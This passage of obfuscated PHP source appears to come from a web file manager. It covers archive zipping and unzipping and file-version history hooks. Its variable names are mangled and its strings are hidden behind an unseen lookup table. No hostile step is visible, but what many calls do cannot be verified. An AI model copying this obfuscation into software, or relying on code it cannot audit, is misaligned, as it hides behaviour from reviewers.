$¼ÆÆİƒÖ = array($°ƒƒÇìı[1225] => $°ƒƒÇìı[1234]); break; } $ÒÖëşöî = $öªáŸ[$°ƒƒÇìı[86]]; if (!isset(self::$driverCache[$ÒÖëşöî])) { $å’¥ÎÛ• = strtolower($¼ÆÆİƒÖ[$°ƒƒÇìı[97]]); $ƒì¢„±ì = $GLOBALS[$°ƒƒÇìı[6]][$°ƒƒÇìı[91]][$°ƒƒÇìı[873]]; $Ö„ìïà¯ = $°ƒƒÇìı[76] . (isset($ƒì¢„±ì[$å’¥ÎÛ•]) ? $ƒì¢„±ì[$å’¥ÎÛ•] : ucfirst($å’¥ÎÛ•)); if (!class_exists($Ö„ìïà¯)) { show_json("{$Ö„ìïà¯}\x20\x6e\157\x74\x20\145\x78\151\x73\164\x73\x21", !1); } $ù“Ø÷á¸ = isset($¼ÆÆİƒÖ[$°ƒƒÇìı[6]]) ? $¼ÆÆİƒÖ[$°ƒƒÇìı[6]] : !1; self::$driverCache[$ÒÖëşöî] = new $Ö„ìïà¯($ù“Ø÷á¸); } $îÆÏĞô = self::$driverCache[$ÒÖëşöî]; $îÆÏĞô->pathDriver = $¢ûœîé…; $îÆÏĞô->pathBase = $°ƒƒÇìı[12]; if (isset($¼ÆÆİƒÖ[$°ƒƒÇìı[6]][$°ƒƒÇìı[1235]])) { $îÆÏĞô->pathBase = rtrim($¼ÆÆİƒÖ[$°ƒƒÇìı[6]][$°ƒƒÇìı[1235]], $°ƒƒÇìı[8]) . $°ƒƒÇìı[8]; $Ôê¡Ï‚° = $îÆÏĞô->pathBase . ltrim($Ôê¡Ï‚°, $°ƒƒÇìı[8]); } $Ôê¡Ï‚° = $îÆÏĞô->getPath($Ôê¡Ï‚°); if (isset($öªáŸ[$°ƒƒÇìı[1206]])) { $Ôê¡Ï‚° = $öªáŸ[$°ƒƒÇìı[1206]]; } $îÆÏĞô->path = $Ôê¡Ï‚°; return $îÆÏĞô; } public static function errorTips($ûà‹¦á = false) { $´·üÅ’ =& $_SERVER[Î‹ÃÂŞ„]; static $Š”í‹¸Ñ = array(); $‰¶ú¿Ä = 1000; if ($ûà‹¦á === -1) { return $Š”í‹¸Ñ ? $Š”í‹¸Ñ[count($Š”í‹¸Ñ) - 1] : $´·üÅ’[12]; } if ($ûà‹¦á === !1) { return implode($´·üÅ’[248], $Š”í‹¸Ñ); } if (count($Š”í‹¸Ñ) >= $‰¶ú¿Ä) { $Š”í‹¸Ñ = array_slice($Š”í‹¸Ñ, $‰¶ú¿Ä * 0.5, $‰¶ú¿Ä); } $Š”í‹¸Ñ[] = $ûà‹¦á; write_log($´·üÅ’[165] . ACTION . $´·üÅ’[1236] . $ûà‹¦á, $´·üÅ’[1237]); } public static function getLastError($¿’ª†Şà = '') { $ıÄ×ˆãÁ = self::errorTips(-1); return $ıÄ×ˆãÁ ? $ıÄ×ˆãÁ : $¿’ª†Şà; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $ä„½ùĞ¤; if ($ä„½ùĞ¤) { return $ä„½ùĞ¤; } $Å›ø®Ä› = IO::init($_SERVER[Î‹ÃÂŞ„][8]); return $Å›ø®Ä›; } private static function iconvSystem($ª’Ùü„Ì) { return self::local()->iconvSystem($ª’Ùü„Ì); } private static function iconvApp($¸ç½×‹º) { return self::local()->iconvApp($¸ç½×‹º); } public static function zipFolder($âë¸—Ò‡, $‹âƒŠÙ = "\172\x69\160", $óäŠ²ßÔ = '', $Í¡ğÁ¦û = REPEAT_RENAME) { $Îïôì› =& $_SERVER[Î‹ÃÂŞ„]; $­•×—Œ = IO::listPath($âë¸—Ò‡); if (!$­•×—Œ) { return !1; } $­•×—Œ = array_merge($­•×—Œ[$Îïôì›[84]], $­•×—Œ[$Îïôì›[85]]); return self::zip($­•×—Œ, $‹âƒŠÙ, $óäŠ²ßÔ, $Í¡ğÁ¦û); } public static function zip($ã³éùƒª, $üğÜÍ·ô = "\172\x69\160", $„”óŒï– = '', $ÖŠ¦Ñ¸„ = REPEAT_RENAME) { $ş¬×áÜÈ =& $_SERVER[Î‹ÃÂŞ„]; if (is_string($ã³éùƒª) && $ã³éùƒª) { $ã³éùƒª = array(array($ş¬×áÜÈ[86] => $ã³éùƒª)); } $øİÌ·ß± = self::init($ã³éùƒª[0][$ş¬×áÜÈ[86]]); $¬¨ ¸ãú = self::info($ã³éùƒª[0][$ş¬×áÜÈ[86]]); $âÕè¾ÜØ = $ş¬×áÜÈ[12]; $ä¯§¢¾ = $ş¬×áÜÈ[12]; $£í®¸İË = $ş¬×áÜÈ[12]; if ($„”óŒï– && substr($„”óŒï–, -1, 1) != $ş¬×áÜÈ[8]) { $ä¯§¢¾ = get_path_father($„”óŒï–); $£í®¸İË = get_path_this($„”óŒï–); } else { $ä¯§¢¾ = self::pathFather($¬¨ ¸ãú[$ş¬×áÜÈ[86]]); $£í®¸İË = $¬¨ ¸ãú[$ş¬×áÜÈ[32]] . $ş¬×áÜÈ[10] . $üğÜÍ·ô; if (count($ã³éùƒª) > 1) { $“Óº„ÍŒ = IO::info($ä¯§¢¾); $£í®¸İË = $“Óº„ÍŒ[$ş¬×áÜÈ[32]] . $ş¬×áÜÈ[10] . $üğÜÍ·ô; } if ($„”óŒï–) { $ä¯§¢¾ = $„”óŒï–; } } if ($øİÌ·ß±->getType() == $ş¬×áÜÈ[108]) { $ÀŠÉ°§˜ = self::init($ä¯§¢¾); $ÔÊÍ¦È = $ÀŠÉ°§˜->getType() == $ş¬×áÜÈ[108] ? $ä¯§¢¾ : get_path_father($øİÌ·ß±->path); $ÔÊÍ¦È = rtrim($ÔÊÍ¦È, $ş¬×áÜÈ[8]) . $ş¬×áÜÈ[8]; mk_dir($ÔÊÍ¦È); } else { $âÕè¾ÜØ = TEMP_FILES . $ş¬×áÜÈ[1238] . time() . rand_string(8) . $ş¬×áÜÈ[8]; mk_dir($âÕè¾ÜØ); file_put_contents($âÕè¾ÜØ . $ş¬×áÜÈ[1239], $ş¬×áÜÈ[12]); $ÔÊÍ¦È = $âÕè¾ÜØ; } $íá²¾´‡ = IO::info($ÔÊÍ¦È); if (!$íá²¾´‡ || !$íá²¾´‡[$ş¬×áÜÈ[219]]) { show_json(LNG($ş¬×áÜÈ[1240]), !1); } $ë‹ì’¹ = self::zipFileList($ã³éùƒª, $âÕè¾ÜØ); foreach ($ë‹ì’¹ as $Ù÷èîğ => $ØÇ¤Æ) { $ë‹ì’¹[$Ù÷èîğ] = self::iconvSystem($ØÇ¤Æ); } $³ÂçÖ¢Œ = get_filename_auto($ÔÊÍ¦È . $£í®¸İË, $ş¬×áÜÈ[12], $ÖŠ¦Ñ¸„); KodArchive::create(self::iconvSystem($³ÂçÖ¢Œ), $ë‹ì’¹); if (!IO::exist($³ÂçÖ¢Œ)) { if ($âÕè¾ÜØ) { del_dir($âÕè¾ÜØ); } show_json(LNG($ş¬×áÜÈ[1241]), !1); } if (!$âÕè¾ÜØ) { return $³ÂçÖ¢Œ; } $¹ôÃµ° = self::move($³ÂçÖ¢Œ, $ä¯§¢¾, $ÖŠ¦Ñ¸„); if ($âÕè¾ÜØ) { del_dir($âÕè¾ÜØ); } if (!$³ÂçÖ¢Œ) { show_json(LNG($ş¬×áÜÈ[1241]), !1); } return $¹ôÃµ°; } public static function unzip($›ÚƒöÄ”, $ÀÊÁË‚, $Ôú£¡¡Õ = "\x2d\61", $©”’Á³Ì = "\x72\145\160\154\x61\x63\x65") { $ª„À”ò– =& $_SERVER[Î‹ÃÂŞ„]; $‹Ÿñ“‘— = parent::info($›ÚƒöÄ”); if (!$‹Ÿñ“‘—) { show_json(LNG($ª„À”ò–[1242]), !1); } $­º¢½Õ² = IO::infoFullSimple($ÀÊÁË‚); if (!$­º¢½Õ²) { $ÀÊÁË‚ = IO::mkdir($ÀÊÁË‚); } if (isset($­º¢½Õ²[$ª„À”ò–[183]]) && trim($­º¢½Õ²[$ª„À”ò–[86]], $ª„À”ò–[8]) != trim($ÀÊÁË‚, $ª„À”ò–[8])) { $çÛú«€È = KodIO::make($­º¢½Õ²[$ª„À”ò–[182]]); $Œ³Áåšù = IO::fileNameAuto($çÛú«€È, $­º¢½Õ²[$ª„À”ò–[32]], REPEAT_RENAME_FOLDER, !0); $ÀÊÁË‚ = IO::mkdir($çÛú«€È . $Œ³Áåšù); } $Ôú£¡¡Õ = $Ôú£¡¡Õ && $Ôú£¡¡Õ != $ª„À”ò–[1243] ? @json_decode($Ôú£¡¡Õ, !0) : -1; $Ú›õóŞ  = self::unzipPart($›ÚƒöÄ”, $Ôú£¡¡Õ); if (!$Ú›õóŞ  || !IO::exist($Ú›õóŞ [$ª„À”ò–[216]])) { show_json(LNG($ª„À”ò–[107]), !1); } $²ß¾±¸ = $Ú›õóŞ [$ª„À”ò–[1244]][count($Ú›õóŞ [$ª„À”ò–[1244]]) - 1]; if ($²ß¾±¸[$ª„À”ò–[1245]] == -1 || substr($²ß¾±¸[$ª„À”ò–[32]], -1, 1) == $ª„À”ò–[8]) { $Œ ’†ıÅ = $Ú›õóŞ [$ª„À”ò–[1246]] . rand_string(10) . $ª„À”ò–[8]; mk_dir($Œ ’†ıÅ); $Ü£¥€ = count($Ú›õóŞ [$ª„À”ò–[1244]]) == 1 ? IO::ext($›ÚƒöÄ”) : get_path_ext($Ú›õóŞ [$ª„À”ò–[216]]); $ØÁ·´´ = KodArchive::extract(self::iconvSystem($Ú›õóŞ [$ª„À”ò–[216]]), $Œ ’†ıÅ, $²ß¾±¸[$ª„À”ò–[1245]], $Œ³Áåšù, $Ü£¥€); self::unzipErrorCheck($ØÁ·´´, array($ª„À”ò–[1247], $›ÚƒöÄ”, $Ü£¥€, $ÀÊÁË‚, $Ú›õóŞ )); Hook::trigger($ª„À”ò–[1248], $Œ ’†ıÅ); recursion_dir($Œ ’†ıÅ, $¥ìÏ·¹, $Í¹”Ñ¨, 0); $É†‡•¤® = array_merge($¥ìÏ·¹, $Í¹”Ñ¨); $İèø‰‘§ = array(); foreach ($É†‡•¤® as $²±ïÊÙÁ) { $âÆŠĞçË = IO::move(self::iconvApp($²±ïÊÙÁ), $ÀÊÁË‚, $©”’Á³Ì); if ($âÆŠĞçË) { $İèø‰‘§[] = $âÆŠĞçË; } } del_dir($Œ ’†ıÅ); } else { $âÆŠĞçË = IO::move($Ú›õóŞ [$ª„À”ò–[216]], $ÀÊÁË‚, $©”’Á³Ì, get_path_this($²ß¾±¸[$ª„À”ò–[32]])); if ($âÆŠĞçË) { $İèø‰‘§[] = $âÆŠĞçË; } } return $İèø‰‘§ ? $İèø‰‘§ : !1; } public static function unzipList($ù‡Î€û) { $”€¸ú =& $_SERVER[Î‹ÃÂŞ„]; $©ú®ŸŒö = isset($ù‡Î€û[$”€¸ú[1249]]) ? $ù‡Î€û[$”€¸ú[1249]] : !1; $ÖõÒ¯ŒÜ = isset($ù‡Î€û[$”€¸ú[1245]]) ? @json_decode($ù‡Î€û[$”€¸ú[1245]], !0) : -1; $£“×å®å = self::unzipPart($ù‡Î€û[$”€¸ú[86]], $ÖõÒ¯ŒÜ); if (!$£“×å®å || !IO::exist($£“×å®å[$”€¸ú[216]])) { show_json(LNG($”€¸ú[107]), !1); } $ÉÄ¤ßÏ = $£“×å®å[$”€¸ú[1244]][count($£“×å®å[$”€¸ú[1244]]) - 1]; $¿ÅÜ©™ = in_array(IO::ext($£“×å®å[$”€¸ú[216]]), array($”€¸ú[359], $”€¸ú[1250], $”€¸ú[1251], $”€¸ú[1252], $”€¸ú[1253], $”€¸ú[1254])); if (!$©ú®ŸŒö && ($ÉÄ¤ßÏ[$”€¸ú[1245]] == -1 || $¿ÅÜ©™)) { $¼˜òÊÂ = $£“×å®å[$”€¸ú[1246]] . get_path_this($£“×å®å[$”€¸ú[216]]) . $”€¸ú[1255]; if (!IO::exist($¼˜òÊÂ)) { $Ù¼Ò¨ùÄ = $ÉÄ¤ßÏ[$”€¸ú[1245]] == -1 ? get_path_ext(IO::pathThis($ù‡Î€û[$”€¸ú[86]])) : get_path_ext($£“×å®å[$”€¸ú[216]]); $ßÊİúÃ÷ = KodArchive::listContent(self::iconvSystem($£“×å®å[$”€¸ú[216]]), !0, $Ù¼Ò¨ùÄ); self::unzipErrorCheck($ßÊİúÃ÷, array($”€¸ú[1256], $ù‡Î€û, $£“×å®å)); @file_put_contents($¼˜òÊÂ, json_encode($ßÊİúÃ÷[$”€¸ú[1257]])); } return @json_decode(IO::getContent($¼˜òÊÂ), !0); } IO::fileOut($£“×å®å[$”€¸ú[216]], $©ú®ŸŒö, get_path_this($ÉÄ¤ßÏ[$”€¸ú[32]])); die; } private static function zipFileList($¾çİ³ÃÀ, $»Ó™Â¬Ê = false) { $ô·›óÛ =& $_SERVER[Î‹ÃÂŞ„]; $•’û ©Ü = array(); foreach ($¾çİ³ÃÀ as $˜£ã³“˜) { $ùşêõÌÔ = $˜£ã³“˜[$ô·›óÛ[86]]; if ($»Ó™Â¬Ê) { $ùşêõÌÔ = self::copy($˜£ã³“˜[$ô·›óÛ[86]], $»Ó™Â¬Ê, $ô·›óÛ[865]); } else { $Úí‡›çå = self::init($˜£ã³“˜[$ô·›óÛ[86]]); if ($Úí‡›çå->getType() == $ô·›óÛ[108]) { $ùşêõÌÔ = $Úí‡›çå->path; } } if ($ùşêõÌÔ && self::local()->exist($ùşêõÌÔ)) { $•’û ©Ü[$˜£ã³“˜[$ô·›óÛ[86]]] = $ùşêõÌÔ; } } if (!empty($•’û ©Ü)) { return array_values($•’û ©Ü); } show_json(LNG($ô·›óÛ[1220]), !1); } private static function localFilePath($êİşŸ) { $ ­ÚÚè =& $_SERVER[Î‹ÃÂŞ„]; $«ùËÑÁê = KodIO::parse($êİşŸ); if ($«ùËÑÁê[$ ­ÚÚè[33]] == KodIO::KOD_SOURCE) { $àĞÛÚæ® = Model($ ­ÚÚè[872])->fileInfoGet(KodIO::sourceID($êİşŸ)); if (!$àĞÛÚæ®[$ ­ÚÚè[86]]) { show_json($ ­ÚÚè[1258], !1); } $êİşŸ = $àĞÛÚæ®[$ ­ÚÚè[86]]; } $˜ÈğÄ¢à = self::init($êİşŸ); if ($˜ÈğÄ¢à->pathParse[$ ­ÚÚè[1206]]) { $êİşŸ = $˜ÈğÄ¢à->pathParse[$ ­ÚÚè[1206]]; $˜ÈğÄ¢à = self::init($êİşŸ); } $ÃÉ®ÕÏó = $˜ÈğÄ¢à->getType(); if ($ÃÉ®ÕÏó == $ ­ÚÚè[108] || $ÃÉ®ÕÏó == $ ­ÚÚè[1259]) { if (!$˜ÈğÄ¢à->exist($˜ÈğÄ¢à->path)) { show_json(LNG($ ­ÚÚè[107]), !1); } return $˜ÈğÄ¢à->path; } return !1; } public static function unzipPart($®²Ñ£µµ, $“ºñ¸¨ = -1) { $¡–§¢”ˆ =& $_SERVER[Î‹ÃÂŞ„]; $¥Åœ›¦ = IO::pathThis($®²Ñ£µµ); if (!$“ºñ¸¨ || $“ºñ¸¨ == -1) { $Ï²çáËË = array(array($¡–§¢”ˆ[32] => $¥Åœ›¦, $¡–§¢”ˆ[1245] => -1)); $Ï²çáËË[0][$¡–§¢”ˆ[1260]] = $Ï²çáËË[0][$¡–§¢”ˆ[32]]; } else { if (is_array($“ºñ¸¨)) { $Ï²çáËË = $“ºñ¸¨; $ÂÑãÖÖí = count($Ï²çáËË) - 1; for ($ŠöİéÇ¸ = 0; $ŠöİéÇ¸ <= $ÂÑãÖÖí; $ŠöİéÇ¸++) { $Âí£»¾ = $Ï²çáËË[$ŠöİéÇ¸]; $¸Ÿì’Ò = get_path_this($Âí£»¾[$¡–§¢”ˆ[32]]) . (checkExtSafe($Âí£»¾[$¡–§¢”ˆ[32]]) ? $¡–§¢”ˆ[12] : $¡–§¢”ˆ[1261]); $Ï²çáËË[$ŠöİéÇ¸][$¡–§¢”ˆ[1260]] = $¡–§¢”ˆ[1262] . intval($Âí£»¾[$¡–§¢”ˆ[1245]]) . $¡–§¢”ˆ[432] . $¸Ÿì’Ò; if ($ŠöİéÇ¸ == 0) { continue; } $Ï²çáËË[$ŠöİéÇ¸][$¡–§¢”ˆ[1260]] = $Ï²çáËË[$ŠöİéÇ¸ - 1][$¡–§¢”ˆ[1260]] . $¡–§¢”ˆ[1263] . $Ï²çáËË[$ŠöİéÇ¸][$¡–§¢”ˆ[1260]]; } } } if (!is_array($Ï²çáËË) || count($Ï²çáËË) == 0) { return !1; } $û“ÀË’ã = $Ï²çáËË[count($Ï²çáËË) - 1]; if (!IO::exist($®²Ñ£µµ)) { return !1; } $Şñ¤Å  = TEMP_FILES . $¡–§¢”ˆ[1264] . kodIO::hashPathSafe($®²Ñ£µµ) . $¡–§¢”ˆ[8]; $¹ôŠ­Şú = $Şñ¤Å  . $û“ÀË’ã[$¡–§¢”ˆ[1260]]; mk_dir($Şñ¤Å ); file_put_contents(TEMP_FILES . $¡–§¢”ˆ[1239], $¡–§¢”ˆ[12]); if (IO::exist($¹ôŠ­Şú)) { return array($¡–§¢”ˆ[216] => $¹ôŠ­Şú, $¡–§¢”ˆ[1244] => $Ï²çáËË, $¡–§¢”ˆ[1246] => $Şñ¤Å ); } $€¡â¢Éö = self::localFilePath($®²Ñ£µµ); if (!$€¡â¢Éö) { $€¡â¢Éö = $Şñ¤Å  . $¡–§¢”ˆ[1265]; if (!IO::exist($€¡â¢Éö)) { self::copy($®²Ñ£µµ, $Şñ¤Å , !1, get_path_this($€¡â¢Éö)); } } if (!$€¡â¢Éö || !IO::exist($€¡â¢Éö)) { return !1; } if ($û“ÀË’ã[$¡–§¢”ˆ[1245]] == -1) { return array($¡–§¢”ˆ[216] => $€¡â¢Éö, $¡–§¢”ˆ[1244] => $Ï²çáËË, $¡–§¢”ˆ[1246] => $Şñ¤Å ); } $àí‹±Ä¯ = $€¡â¢Éö; foreach ($Ï²çáËË as $ŠöİéÇ¸ => $Âí£»¾) { if (!$Âí£»¾ || $Âí£»¾[$¡–§¢”ˆ[1245]] == $¡–§¢”ˆ[1243]) { break; } if (substr($Âí£»¾[$¡–§¢”ˆ[32]], -1, 1) == $¡–§¢”ˆ[8]) { break; } $«©Ü„¶÷ = in_array(get_path_ext($Âí£»¾[$¡–§¢”ˆ[1260]]), array($¡–§¢”ˆ[359], $¡–§¢”ˆ[1250], $¡–§¢”ˆ[1251], $¡–§¢”ˆ[1252], $¡–§¢”ˆ[1253], $¡–§¢”ˆ[1254])); $‚€¶·åÛ = $ŠöİéÇ¸ == count($Ï²çáËË) - 1 && $«©Ü„¶÷; $Üßêì‹ˆ = $Şñ¤Å  . $Âí£»¾[$¡–§¢”ˆ[1260]]; $ôáÉÍ© = $Şñ¤Å  . get_path_this($Âí£»¾[$¡–§¢”ˆ[32]]); if (IO::exist($Üßêì‹ˆ)) { $àí‹±Ä¯ = $Üßêì‹ˆ; continue; } $šÙÛÔÓÆ = $ŠöİéÇ¸ == 0 ? get_path_ext($¥Åœ›¦) : get_path_ext($àí‹±Ä¯); $¹èêÀâ£ = KodArchive::extract(self::iconvSystem($àí‹±Ä¯), $Şñ¤Å , $Âí£»¾[$¡–§¢”ˆ[1245]], $³£Æ’îİ, $šÙÛÔÓÆ); self::unzipErrorCheck($¹èêÀâ£, array($¡–§¢”ˆ[1266], $®²Ñ£µµ, $Ï²çáËË, $Âí£»¾, $Üßêì‹ˆ)); if (IO::exist($ôáÉÍ©)) { IO::rename($ôáÉÍ©, get_path_this($Üßêì‹ˆ)); } $àí‹±Ä¯ = $Üßêì‹ˆ; } $¹ôŠ­Şú = $àí‹±Ä¯; return array($¡–§¢”ˆ[216] => $àí‹±Ä¯, $¡–§¢”ˆ[1244] => $Ï²çáËË, $¡–§¢”ˆ[1246] => $Şñ¤Å ); } private static function unzipErrorCheck($ù¾­Šòò, $öÄˆàÈ = false) { $Ú§ä¢öü =& $_SERVER[Î‹ÃÂŞ„]; if ($ù¾­Šòò[$Ú§ä¢öü[1267]]) { return !0; } write_log(array($Ú§ä¢öü[1268], $ù¾­Šòò, $öÄˆàÈ), $Ú§ä¢öü[1269]); show_json($Ú§ä¢öü[1270] . json_encode($ù¾­Šòò[$Ú§ä¢öü[1257]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $¿¦‹íÙ =& $_SERVER[Î‹ÃÂŞ„]; $®»ÆÑÌ· = $GLOBALS[$¿¦‹íÙ[6]][$¿¦‹íÙ[91]]; if ($®»ÆÑÌ·[$¿¦‹íÙ[1271]] != 1) { return; } if ($®»ÆÑÌ·[$¿¦‹íÙ[1272]] <= 0) { return; } if (isset($_REQUEST[$¿¦‹íÙ[1273]]) && $_REQUEST[$¿¦‹íÙ[1273]] == $¿¦‹íÙ[90]) { return; } Hook::bind($¿¦‹íÙ[1274], $¿¦‹íÙ[1275]); Hook::bind($¿¦‹íÙ[1276], $¿¦‹íÙ[1277]); Hook::bind($¿¦‹íÙ[1278], $¿¦‹íÙ[1279]); Hook::bind($¿¦‹íÙ[1280], $¿¦‹íÙ[1281]); Hook::bind($¿¦‹íÙ[1282], $¿¦‹íÙ[1283]); Hook::bind($¿¦‹íÙ[1284], $¿¦‹íÙ[1285]); } public static function eventBeforeUpload($Î¾‹áæÇ) { if ($Î¾‹áæÇ[3] && $Î¾‹áæÇ[3] != REPEAT_REPLACE) { return; } $ê¹®­Ñ˜ = self::parsePath($Î¾‹áæÇ[0]); if (!$ê¹®­Ñ˜) { return; } self::add($ê¹®­Ñ˜); } public static function eventBeforeEdit($³’ÖÄöş) { $‰ÉÓ¸ö = self::parsePath($³’ÖÄöş[0]); if (!$‰ÉÓ¸ö) { return; } self::add($‰ÉÓ¸ö); } public static function eventBeforeCopyFile($í—“­ĞÅ, $±¤÷ÊÉ§, $‡Ãá²Ğ§, $Ëİ§÷ğ€, $şˆüâ™È, $åƒ¼ãİ©) { $æëÒ„Âš =& $_SERVER[Î‹ÃÂŞ„]; if (isset($‡Ãá²Ğ§->_data[$æëÒ„Âš[1210]]) && $‡Ãá²Ğ§->_data[$æëÒ„Âš[1210]]) { return; } $´š²ş¢• = $‡Ãá²Ğ§->getPathOuter($Ëİ§÷ğ€); $á’¼‘ùˆ = self::parsePath($´š²ş¢•); if (!$á’¼‘ùˆ) { return; } self::add($á’¼‘ùˆ); } public static function eventBeforeRename($·¯Ø–îŞ) { $š‚¨öúş =& $_SERVER[Î‹ÃÂŞ„]; $›„Î×“» = self::parsePath($·¯Ø–îŞ[0]); if (!$›„Î×“») { return; } $¨Ï½»„‰ = self::checkInHistory($›„Î×“»); if (!$¨Ï½»„‰) { return; } if ($¨Ï½»„‰[$š‚¨öúş[33]] == $š‚¨öúş[216]) { $ı–ÈŞ‘œ = self::listData($›„Î×“»); if ($ı–ÈŞ‘œ && $ı–ÈŞ‘œ[$š‚¨öúş[415]]) { self::moveHistory($›„Î×“», $·¯Ø–îŞ[1]); } } else { IO::rename($¨Ï½»„‰[$š‚¨öúş[86]], $·¯Ø–îŞ[1]); } } public static function eventBeforeMove($¯çùŸ¿µ) { $ª³ª»€à =& $_SERVER[Î‹ÃÂŞ„]; $ÒºÑŞ£İ = self::parsePath($¯çùŸ¿µ[0]); if (!$ÒºÑŞ£İ) { return; } $¨Ê¢ø“³ = self::parsePath($¯çùŸ¿µ[1]); if (!$¨Ê¢ø“³) { return; } $¾ âˆñÜ = $¯çùŸ¿µ[3]; $à‹ß‹° = self::checkInHistory($ÒºÑŞ£İ); if (!$à‹ß‹°) { return; } $ºİ¬Ô¹± = self::pathHistory($¨Ê¢ø“³); if ($à‹ß‹°[$ª³ª»€à[33]] == $ª³ª»€à[216]) { $°ä…¾Çí = self::listData($ÒºÑŞ£İ); $ÊÜıÅÂß = rtrim($¨Ê¢ø“³, $ª³ª»€à[8]) . $ª³ª»€à[8] . ($¾ âˆñÜ ? $¾ âˆñÜ : get_path_this($ÒºÑŞ£İ)); $ÇÙï­¡í = self::listData($ÊÜıÅÂß); if ($°ä…¾Çí && $°ä…¾Çí[$ª³ª»€à[415]] && $ÇÙï­¡í && $ÇÙï­¡í[$ª³ª»€à[415]]) { return self::clear($ÒºÑŞ£İ); } if ($°ä…¾Çí && $°ä…¾Çí[$ª³ª»€à[415]]) { self::moveHistory($ÒºÑŞ£İ, $¾ âˆñÜ, $ºİ¬Ô¹±); } } else { IO::move($à‹ß‹°[$ª³ª»€à[86]], $ºİ¬Ô¹±, !1, $¾ âˆñÜ); self::clearEmptyFolder(IO::pathFather($à‹ß‹°[$ª³ª»€à[86]])); } } public static function eventAfterRemove($‚ôÖÂ—Ï, $ä—¦ÇÊë) { $÷ÈüÁ¯Û =& $_SERVER[Î‹ÃÂŞ„]; if (!$ä—¦ÇÊë) { return; } $ú©¡ë¼ = self::parsePath($‚ôÖÂ—Ï[0]); if (!$ú©¡ë¼) { return; } $­âëÌ§ø = self::checkInHistory($ú©¡ë¼); if (!$­âëÌ§ø) { return; } if ($­âëÌ§ø[$÷ÈüÁ¯Û[33]] == $÷ÈüÁ¯Û[216]) { $ƒÁ”äÖ„ = self::listData($ú©¡ë¼, !1); if ($ƒÁ”äÖ„ && $ƒÁ”äÖ„[$÷ÈüÁ¯Û[415]]) { self::clear($ú©¡ë¼, !1); } } else { IO::remove($­âëÌ§ø[$÷ÈüÁ¯Û[86]]); self::clearEmptyFolder(IO::pathFather($­âëÌ§ø[$÷ÈüÁ¯Û[86]])); } } private static function checkInHistory($Ö—¬•–ë) { $ŸÛÊõÒ½ = self::pathHistory($Ö—¬•–ë); if (!IO::exist($ŸÛÊõÒ½)) { $ŸÛÊõÒ½ .= $_SERVER[Î‹ÃÂŞ„][1286]; } return IO::exist($ŸÛÊõÒ½) ? IO::info($ŸÛÊõÒ½) : !1; } private static function parsePath($óßÈ¸ñ) { $®Óæä›Õ =& $_SERVER[Î‹ÃÂŞ„]; if (!$óßÈ¸ñ) { return !1; } if ($GLOBALS[$®Óæä›Õ[1287]]) { return; } $Û¿¶èµ™ = KodIO::parse($óßÈ¸ñ); $§Åîã•ä = $Û¿¶èµ™[$®Óæä›Õ[33]]; $ÏÓ£½³° = !$§Åîã•ä || $§Åîã•ä == KodIO::KOD_IO || $§Åîã•ä == KodIO::KOD_SHARE_ITEM; if (!$ÏÓ£½³° || !$Û¿¶èµ™[$®Óæä›Õ[1288]]) { return !1; } if (substr($óßÈ¸ñ, 0, strlen(DATA_PATH . $®Óæä›Õ[1289])) == DATA_PATH . $®Óæä›Õ[1289]) { return !1; } if ($§Åîã•ä == KodIO::KOD_SHARE_ITEM) { $ÅŞşàÉ = IO::init($óßÈ¸ñ); if ($ÅŞşàÉ->pathParse[$®Óæä›Õ[1206]]) { return self::parsePath($ÅŞşàÉ->pathParse[$®Óæä›Õ[1206]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $¯‰Ì¤÷‘ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $®Óæä›Õ[1290]); foreach ($¯‰Ì¤÷‘ as $Ş‰¶ãÅ–) { if (!$§Åîã•ä && substr($óßÈ¸ñ, 0, strlen($Ş‰¶ãÅ–)) == $Ş‰¶ãÅ–) { return !1; } } self::log($GLOBALS[$®Óæä›Õ[1201]] . $®Óæä›Õ[1291] . $óßÈ¸ñ); return $óßÈ¸ñ; } private static function pathHistory($ÆŞ¹Ÿ˜Ñ) { $¦Ü¸Ù¢Ñ =& $_SERVER[Î‹ÃÂŞ„]; $½¡¼ı‡è = self::$_historyBase . ltrim(KodIO::clear($ÆŞ¹Ÿ˜Ñ), $¦Ü¸Ù¢Ñ[8]); $½¡¼ı‡è = str_replace(array($¦Ü¸Ù¢Ñ[1292]), array($¦Ü¸Ù¢Ñ[1293]), $½¡¼ı‡è); return $½¡¼ı‡è; } public static function log($ĞÎ£ìä) { } public static function historyCount($®›é°Ô) { $şÖÛìˆà =& $_SERVER[Î‹ÃÂŞ„]; $¤õÚ©ˆü = array(); $©§¶ó¨ = array(); foreach ($®›é°Ô as $í¢„ö¡) { $¨íöŒçü = get_path_father($í¢„ö¡); if (!$©§¶ó¨[$¨íöŒçü]) { $©§¶ó¨[$¨íöŒçü] = array(); } $©§¶ó¨[$¨íöŒçü][] = get_path_this($í¢„ö¡); } foreach ($©§¶ó¨ as $¨íöŒçü => $—®ÓÜÇ‹) { $«ñ¦Âˆß = self::parsePath($¨íöŒçü); if (!$«ñ¦Âˆß) { continue; } foreach ($—®ÓÜÇ‹ as $›°æ”Ø¥) { $Áøà¢ó„ = self::listData(rtrim($«ñ¦Âˆß, $şÖÛìˆà[8]) . $şÖÛìˆà[8] . $›°æ”Ø¥, !1); if ($Áøà¢ó„ && $Áøà¢ó„[$şÖÛìˆà[415]]) { $¤õÚ©ˆü[rtrim($¨íöŒçü, $şÖÛìˆà[8]) . $şÖÛìˆà[8] . $›°æ”Ø¥] = count($Áøà¢ó„[$şÖÛìˆà[415]]); } } } return $¤õÚ©ˆü; } public static function add($ÀÄÙ†®ê) { $ÔÇ¼Üñ· =& $_SERVER[Î‹ÃÂŞ„]; $“Ü½¿’¾ = self::listData($ÀÄÙ†®ê); if (!$“Ü½¿’¾) { return; } $Á•£ò”ş = Model($ÔÇ¼Üñ·[817])->get($ÔÇ¼Üñ·[1294]); $¬÷í«£ = intval($GLOBALS[$ÔÇ¼Üñ·[6]][$ÔÇ¼Üñ·[91]][$ÔÇ¼Üñ·[1272]]); $Óù·íçõ = $Á•£ò”ş == $ÔÇ¼Üñ·[1295] ? min(5, $¬÷í«£) : $¬÷í«£; if ($¬÷í«£ <= 0) { return; } $Àâ¯™¿á = IO::info($ÀÄÙ†®ê); $£‡¦…‹ = $“Ü½¿’¾[$ÔÇ¼Üñ·[415]]; if ($Àâ¯™¿á[$ÔÇ¼Üñ·[78]] == 0) { return; } if 